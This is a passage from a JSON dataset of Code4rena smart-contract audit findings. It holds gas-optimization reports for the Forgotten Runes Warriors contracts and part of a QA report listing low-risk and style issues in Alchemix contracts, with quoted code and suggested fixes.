│\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  withdrawAll              ·          -  ·          -  ·         35038  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  Deployments                                               ·                                            ·  % of limit   ·             │\r\n·····························································|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild                               ·          -  ·          -  ·       2690226  ·          9 %  ·          -  │\r\n·····························································|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter                              ·    4119642  ·    4119666  ·       4119664  ·       13.7 %  ·          -  │\r\n·------------------------------------------------------------|-------------|-------------|----------------|---------------|-------------·\r\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/240"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### **Pre-incrementing a variable is cheaper than post-incrementing it**\n\n**Details**: Consider the following changes to save gas:\n\n1. Change [L193](https://github.com/code-423n4/2022-05-runes/blob/47a7087e21f98838db18559db31676c6a2befde1/contracts/ForgottenRunesWarriorsMinter.sol#L193) of ForgottenRunesWarriorsMinter.sol to `++numSold;`.\n2. Change [L248](https://github.com/code-423n4/2022-05-runes/blob/47a7087e21f98838db18559db31676c6a2befde1/contracts/ForgottenRunesWarriorsMinter.sol#L248) of ForgottenRunesWarriorsMinter.sol to `++numClaimed;`. \n\n### Unnecessary zero-address validation\n\n**Details**: Since the deployer of the contract will never be `address(0)` and function `forwardERC20s` uses a `onlyOwner` modifier, the check in [L174 of ForgottenRunesWarriorsGuild.sol](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsGuild.sol#L174) is not needed. The same applies to [L628 of ForgottenRunesWarriorsMinter.sol](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L628).\n\n### **Unnecessary checked arithmetic in for loop**\n\n**Details**: There is no risk that the loop counters below can overflow:\n\n1. [L162](https://github.com/code-423n4/2022-05-runes/blob/47a7087e21f98838db18559db31676c6a2befde1/contracts/ForgottenRunesWarriorsMinter.sol#L162) of ForgottenRunesWarriorsMinter.sol\n2. [L220](https://github.com/code-423n4/2022-05-runes/blob/47a7087e21f98838db18559db31676c6a2befde1/contracts/ForgottenRunesWarriorsMinter.sol#L220) of ForgottenRunesWarriorsMinter.sol\n3. [L259](https://github.com/code-423n4/2022-05-runes/blob/47a7087e21f98838db18559db31676c6a2befde1/contracts/ForgottenRunesWarriorsMinter.sol#L259) of ForgottenRunesWarriorsMinter.sol\n4. [L355](https://github.com/code-423n4/2022-05-runes/blob/47a7087e21f98838db18559db31676c6a2befde1/contracts/ForgottenRunesWarriorsMinter.sol#L355) of ForgottenRunesWarriorsMinter.sol\n\nThus, it is recommended to use `unchecked` keyword to disable checked arithmetic when iterating the loop counter — see [G011](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g011---unnecessary-checked-arithmetic-in-for-loop) for more information.\n\n**Remark**: Pre-incrementing a variable is cheaper than post-incrementing it, so consider replacing `i++` by `++i` when doing this change.",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/237"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Optimizations\n* variables in solidity are initialized automatically to their default value, and it actually costs more gas to initialize them manually, so the `numMinted` variable in the `ForgottenRunesWarriorsGuild` contract shouldn't be initialized\n    ```sol\n    uint256 public numMinted;\n    // uint256 public numMinted = 0; // costs more gas\n    ```\n* Use unchecked in the `bidSummon` function - we know for sure that the first expression won't overflow because `currentPrice * numWarriors <= startingPrice * 20 < 2**256 - 1`, and the second calculations won't overflow because `daNumMinted[msg.sender] + numWarriors <= numSold + numWarriors <= max supply < 2**256 - 1`\n    ```sol\n    require(\n        msg.value >= (currentPrice * numWarriors),\n        'Ether value sent is not sufficient'\n    );\n    // ...\n    daNumMinted[msg.sender] += numWarriors;\n    numSold += numWarriors;\n    ```\n* Use unchecked in the `currentDaPrice` function - we know that `stepDeduction <= startPrice` so `startPrice - stepDeduction` won't underflow\n    ```sol\n    if (stepDeduction > startPrice) {\n        return lowestPrice;\n    }\n    uint256 currentPrice = startPrice - stepDeduction;\n    ```\n\n\n* Loops can be optimized in several ways. Let's take for example the loop in the `bidSummon`, `teamSummon` and in the `publicSummon` functions\n    ```sol\n    for (uint256 i = 0; i < numWarriors; i++) {\n        _mint(msg.sender);\n    }\n    ```\n    We can do multiple things here:\n    1. Variables in solidity are already initialized to their default value, and initializing them to the same value actually costs more gas. So for example in the loop above, the code can be optimized using `uint i;` instead of `uint i = 0;`.\n    2. Use ++i instead of i++ to save some gas spent in every iteration.\n    3. Use unchecked when incrementing i\n    So after all these changes, the code will look something like this:\n    ```sol\n    for (uint256 i; i < numWarriors; ) {\n        _mint(msg.sender);\n        unchecked { ++i; }\n    }\n    ```\n    There is another loop in the `issueRefunds` function you can apply similar changes to in order to optimize it.\n\n* Gas optimizations of the `issueRefunds` function (and some helper functions it uses)\n\n    I optimized this function with multiple optimizations, so I'll describe them in steps, so it'll be easier for you to review each optimization alone and use the ones you want. \n    \n    This is the code of the original function with the helper functions it uses:\n    ```sol\n    function issueRefunds(uint256 startIdx, uint256 endIdx)\n        public\n        onlyOwner\n        nonReentrant\n    {\n        for (uint256 i = startIdx; i < endIdx + 1; i++) {\n            _refundAddress(daMinters[i]);\n        }\n    }\n\n    function _refundAddress(address minter) private {\n        uint256 owed = refundOwed(minter);\n        if (owed > 0) {\n            daAmountRefunded[minter] += owed;\n            _safeTransferETHWithFallback(minter, owed);\n        }\n    }\n\n    function refundOwed(address minter) public view returns (uint256) {\n        uint256 totalCostOfMints = finalPrice * daNumMinted[minter];\n        uint256 refundsPaidAlready = daAmountRefunded[minter];\n        return daAmountPaid[minter] - totalCostOfMints - refundsPaidAlready;\n    }\n\n    /**\n     * @notice Transfer ETH. If the ETH transfer fails, wrap the ETH and try send it as WETH.\n     * @param to account who to send the ETH or WETH to\n     * @param amount uint256 how much ETH or WETH to send\n     */\n    function _safeTransferETHWithFallback(address to, uint256 amount) internal {\n        if (!_safeTransferETH(to, amount)) {\n            IWETH(weth).deposit{value: amount}();\n            IERC20(weth).transfer(to, amount);\n        }\n    }\n\n    /**\n     * @notice Transfer ETH and return the success status.\n     * @dev This function only forwards 30,000 gas to the callee.\n     * @param to account who to send the ETH to\n     * @param value uint256 how much ETH to send\n     */\n    function _safeTransferETH(address to, uint256 value)\n        internal\n        returns (bool)\n    {\n        (bool success, ) = to.call{value: value, gas: 30_000}(new bytes(0));\n        return success;\n    }\n    ```\n    The starting gas cost from the report is 69745 - 143756 (Min = 69745, Max = 143756).\n    1. The first optimization is the loop optimization that I described before. These optimizations reduce the cost to 69531 - 143542.\n    2. The second optimization is that instead of using the `daAmountRefunded` mapping, you can simply subtract from the `daAmountPaid` value of the user. \n    \n        This optimization will make the contract use less storage and make the gas cost of the function a lot cheaper, because the reduction in the storage usage and because the `refundOwed` function will return `daAmountPaid[minter] - totalCostOfMints` instead of `daAmountPaid[minter] - totalCostOfMints - refundsPaidAlready` which is a simpler calculation. \n        \n        This optimization reduces the gas cost to 50181 - 124192, which is a big change compared to the previous cost.\n    3. Inline the safeTransferEthWithFallback and safeTransferEth function, which means write their code inside the function instead of calling the functions.\n   \n        This reduces the cost to 50098 - 124097.\n    4. Use unchecked in the _refundAddress function - the calculations will be something like \n        ```sol\n        uint newTotalPaid = finalPrice * daNumMinted[minter];\n        uint owed = totalPaid - newTotalPaid;\n        ```\n        and you can use unchecked to make them cheaper (we know it won't overflow or underflow because we know that `finalPrice * daNumMinted[minter] <= newTotalPaid`). \n        This reduces the cost to 50009 - 124008.\n    5. Replace the `bytes(0)` with `\"\"` in the low level call.\n    6. Inline the _refundAddress and refundOwed functions, and also optimize the code. Some optimization can be done there because the inlined code uses the same (storage) values that can be saved in order to use less storage.\n\n    ---\n    The new code will look something like this:\n    ```sol\n    function issueRefunds(uint256 startIdx, uint256 endIdx)\n        public\n        onlyOwner\n        nonReentrant\n    {\n        unchecked {\n            for (uint256 i = startIdx; i <= endIdx; ) {\n                // _refundAddress(daMinters[i]);\n                address minter = daMinters[i];\n                uint totalPaid = daAmountPaid[minter];\n                // uint256 owed = refundOwed(minter);\n                uint newTotalPaid = finalPrice * daNumMinted[minter];\n                uint owed = totalPaid - newTotalPaid;\n                if (owed > 0) {\n                    // daAmountRefunded[minter] += owed;\n                    daAmountPaid[minter] = newTotalPaid;\n                    // _safeTransferETHWithFallback(, owed);\n                    (bool success, ) = minter.call{value: owed, gas: 30_000}(\"\");\n                    if (!success) {\n                        IWETH(weth).deposit{value: owed}();\n                        IERC20(weth).transfer(minter, owed);\n                    }\n                }\n                ++i;\n            }\n        }\n    }\n    ```\n    The final cost of this implementation is 49485 - 123444, which is ~29% improvement on the minimum cost, and ~14% on the maximum cost.",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/222"
    }
  },
  {
    "title": "QA Report",
    "body": "## Summary\r\n\r\n### Low Risk Issues\r\n| |Issue|Instances|\r\n|-|:-|:-:|\r\n| 1 | Latent funds can be stolen | 1 |\r\n| 2 | Low level calls don't check for contract existence | 1 |\r\n| 3 | Set sane maximums for input parameters | 2 |\r\n| 4 | Behavior described by comment is incomplete | 1 |\r\n| 5 | Unsafe use of `transfer()`/`transferFrom()` with `IERC20` | 4 |\r\n| 6 | Return values of `transfer()`/`transferFrom()` not checked | 2 |\r\n| 7 | Unused/empty `receive()` function | 2 |\r\n| 8 | `safeApprove()` is deprecated | 32 |\r\n| 9 | Missing checks for `address(0x0)` when assigning values to `address` state variables | 24 |\r\n| 10 | `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()` | 1 |\r\n| 11 | Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions | 3 |\r\n\r\nTotal: 73 instances over 11 issues\r\n\r\n### Non-critical Issues\r\n| |Issue|Instances|\r\n|-|:-|:-:|\r\n| 1 | Adding a `return` statement when the function defines a named return variable, is redundant | 4 |\r\n| 2 | `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings | 1 |\r\n| 3 | `public` functions not called by the contract should be declared `external` instead | 12 |\r\n| 4 | `2**<n> - 1` should be re-written as `type(uint<n>).max` | 1 |\r\n| 5 | `constant`s should be defined rather than using magic numbers | 20 |\r\n| 6 | Redundant cast | 4 |\r\n| 7 | Numeric values having to do with time should use time units for readability | 1 |\r\n| 8 | Missing event for critical parameter change | 3 |\r\n| 9 | Use a more recent version of solidity | 12 |\r\n| 10 | Use a more recent version of solidity | 1 |\r\n| 11 | Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`) | 2 |\r\n| 12 | Inconsistent spacing in comments | 11 |\r\n| 13 | Non-library/interface files should use fixed compiler versions, not floating ones | 16 |\r\n| 14 | Typos | 12 |\r\n| 15 | File does not contain an SPDX Identifier | 32 |\r\n| 16 | File is missing NatSpec | 27 |\r\n| 17 | NatSpec is incomplete | 17 |\r\n| 18 | Event is missing `indexed` fields | 111 |\r\n| 19 | Use allowlist/denylist rather than blacklist/whitelist | 1 |\r\n\r\nTotal: 288 instances over 19 issues\r\n\r\n\r\n\r\n## Low Risk Issues\r\n\r\n### 1. Latent funds can be stolen\r\nIf someone manages, through either a bug or a mistake (self-destructing and sending funds to the contract), another user can claim the funds as their own. Measure the balance before and after, and use the difference, rather than measuring the total balance of the contract\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/WETHGateway.sol   #1\r\n\r\n70           IAlchemistV2(alchemist).withdrawUnderlyingFrom(msg.sender, yieldToken, shares, address(this), minimumAmountOut);\r\n71   \r\n72           uint256 amount = WETH.balanceOf(address(this));\r\n73           WETH.withdraw(amount);\r\n74   \r\n75:          (bool success, ) = recipient.call{value: amount}(new bytes(0));\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/WETHGateway.sol#L70-L75\r\n\r\n### 2. Low level calls don't check for contract existence\r\nLow level calls return success if called on a destructed contract. See OpenZeppelin's Address.so which checks address.code.length\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/libraries/TokenUtils.sol   #1\r\n\r\n65       function safeTransfer(address token, address recipient, uint256 amount) internal {\r\n66           (bool success, bytes memory data) = token.call(\r\n67               abi.encodeWithSelector(IERC20Minimal.transfer.selector, recipient, amount)\r\n68:          );\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/libraries/TokenUtils.sol#L65-L68\r\n\r\n### 3. Set sane maximums for input parameters\r\nThere should be an upper limit to reasonable fees\r\n\r\n*There are 2 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2Base.sol   #1\r\n\r\n98     function setFlashFee(uint256 newFee) external onlyAdmin {\r\n99       flashMintFee = newFee;\r\n100      emit SetFlashMintFee(flashMintFee);\r\n101:   }\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemicTokenV2Base.sol#L98-L101\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2.sol   #2\r\n\r\n92     function setFlashFee(uint256 newFee) external onlyAdmin {\r\n93       flashMintFee = newFee;\r\n94       emit SetFlashMintFee(flashMintFee);\r\n95:    }\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemicTokenV2.sol#L92-L95\r\n\r\n### 4. Behavior described by comment is incomplete\r\nThe event is not emitted when the fee is updated the first time (in the constructor)\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2.sol   #1\r\n\r\n50     /// @notice An event which is emitted when the flash mint fee is updated.\r\n51     ///\r\n52     /// @param fee The new flash mint fee.\r\n53     event SetFlashMintFee(uint256 fee);\r\n54   \r\n55     constructor(string memory _name, string memory _symbol, uint256 _flashFee) ERC20(_name, _symbol) {\r\n56       _setupRole(ADMIN_ROLE, msg.sender);\r\n57       _setupRole(SENTINEL_ROLE, msg.sender);\r\n58       _setRoleAdmin(SENTINEL_ROLE, ADMIN_ROLE);\r\n59       _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);\r\n60       flashMintFee = _flashFee;\r\n61:    }\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemicTokenV2.sol#L50-L61\r\n\r\n### 5. Unsafe use of `transfer()`/`transferFrom()` with `IERC20`\r\nSome tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens.  For example Tether (USDT)'s `transfer()` and `transferFrom()` functions do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to `IERC20`, their function signatures do not match and therefore the calls made, revert. Use OpenZeppelin’s `SafeERC20`'s `safeTransfer()`/`safeTransferFrom()` instead\r\n\r\n*There are 4 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveMetapool.sol   #1\r\n\r\n16:           IERC20(underlyingToken).transferFrom(msg.sender, address(this), collateralInitial);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveMetapool.sol#L16\r\n\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveFactoryethpool.sol   #2\r\n\r\n26:               IERC20(underlyingToken).transferFrom(msg.sender, address(this), collateralInitial);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveFactoryethpool.sol#L26\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #3\r\n\r\n89:           bool success = alcx.transferFrom(msg.sender, address(this), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L89\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #4\r\n\r\n106:          bool success = alcx.transfer(msg.sender, amount); // Should return true or revert, but doesn't hurt\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L106\r\n\r\n### 6. Return values of `transfer()`/`transferFrom()` not checked\r\nNot all `IERC20` implementations `revert()` when there's a failure in `transfer()`/`transferFrom()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually making a payment\r\n\r\n*There are 2 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveMetapool.sol   #1\r\n\r\n16:           IERC20(underlyingToken).transferFrom(msg.sender, address(this), collateralInitial);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveMetapool.sol#L16\r\n\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveFactoryethpool.sol   #2\r\n\r\n26:               IERC20(underlyingToken).transferFrom(msg.sender, address(this), collateralInitial);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveFactoryethpool.sol#L26\r\n\r\n### 7. Unused/empty `receive()` function\r\nIf the intention is for the Ether to be used, the function should call another function, otherwise it should revert\r\n\r\n*There are 2 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveFactoryethpool.sol   #1\r\n\r\n17:       receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveFactoryethpool.sol#L17\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #2\r\n\r\n228:      receive() external payable { }\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L228\r\n\r\n### 8. `safeApprove()` is deprecated\r\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead\r\n\r\n*There are 32 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #1\r\n\r\n236:                  TokenUtils.safeApprove(registeredUnderlyings[i], alchemist, 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L236\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #2\r\n\r\n238:              TokenUtils.safeApprove(debtToken, alchemist, 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L238\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #3\r\n\r\n243:              TokenUtils.safeApprove(registeredUnderlyings[i], alchemist, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L243\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #4\r\n\r\n245:          TokenUtils.safeApprove(debtToken, alchemist, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L245\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #5\r\n\r\n284:          TokenUtils.safeApprove(underlyingToken, alchemist, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L284\r\n\r\n```solidity\r\nFile: contracts-full/adapters/lido/WstETHAdapterV1.sol   #6\r\n\r\n105:          SafeERC20.safeApprove(parentToken, address(token), mintedStEth);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/lido/WstETHAdapterV1.sol#L105\r\n\r\n```solidity\r\nFile: contracts-full/adapters/lido/WstETHAdapterV1.sol   #7\r\n\r\n129:          SafeERC20.safeApprove(parentToken, curvePool, unwrappedStEth);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/lido/WstETHAdapterV1.sol#L129\r\n\r\n```solidity\r\nFile: contracts-full/adapters/vesper/VesperAdapterV1.sol   #8\r\n\r\n62:           SafeERC20.safeApprove(underlyingToken, token, amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/vesper/VesperAdapterV1.sol#L62\r\n\r\n```solidity\r\nFile: contracts-full/adapters/fuse/FuseTokenAdapterV1.sol   #9\r\n\r\n71:           SafeERC20.safeApprove(underlyingToken, token, amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/fuse/FuseTokenAdapterV1.sol#L71\r\n\r\n```solidity\r\nFile: contracts-full/adapters/yearn/YearnTokenAdapter.sol   #10\r\n\r\n32:           TokenUtils.safeApprove(underlyingToken, token, amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/yearn/YearnTokenAdapter.sol#L32\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #11\r\n\r\n782:              SafeERC20.safeApprove(address(tokens[i]), address(threePool), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L782\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #12\r\n\r\n783:              SafeERC20.safeApprove(address(tokens[i]), address(threePool), amounts[i]);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L783\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #13\r\n\r\n838:          SafeERC20.safeApprove(address(token), address(threePool), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L838\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #14\r\n\r\n839:          SafeERC20.safeApprove(address(token), address(threePool), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L839\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #15\r\n\r\n879:          SafeERC20.safeApprove(address(threePoolToken), address(threePool), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L879\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #16\r\n\r\n880:          SafeERC20.safeApprove(address(threePoolToken), address(threePool), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L880\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #17\r\n\r\n908:              SafeERC20.safeApprove(address(tokens[i]), address(metaPool), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L908\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #18\r\n\r\n909:              SafeERC20.safeApprove(address(tokens[i]), address(metaPool), amounts[i]);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L909\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #19\r\n\r\n944:          SafeERC20.safeApprove(address(token), address(metaPool), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L944\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #20\r\n\r\n945:          SafeERC20.safeApprove(address(token), address(metaPool), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L945\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #21\r\n\r\n987:          SafeERC20.safeApprove(address(metaPool), address(convexBooster), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L987\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #22\r\n\r\n988:          SafeERC20.safeApprove(address(metaPool), address(convexBooster), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L988\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #23\r\n\r\n576:              SafeERC20.safeApprove(address(tokens[i]), address(metaPool), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L576\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #24\r\n\r\n577:              SafeERC20.safeApprove(address(tokens[i]), address(metaPool), amounts[i]);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L577\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #25\r\n\r\n620:              SafeERC20.safeApprove(address(token), address(metaPool), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L620\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #26\r\n\r\n621:              SafeERC20.safeApprove(address(token), address(metaPool), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L621\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #27\r\n\r\n671:          SafeERC20.safeApprove(address(metaPool), address(convexBooster), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L671\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #28\r\n\r\n672:          SafeERC20.safeApprove(address(metaPool), address(convexBooster), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L672\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #29\r\n\r\n382:          TokenUtils.safeApprove(yieldToken, config.adapter, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L382\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #30\r\n\r\n383:          TokenUtils.safeApprove(adapter.underlyingToken(), config.adapter, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L383\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #31\r\n\r\n478:          TokenUtils.safeApprove(yieldToken, adapter, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L478\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #32\r\n\r\n479:          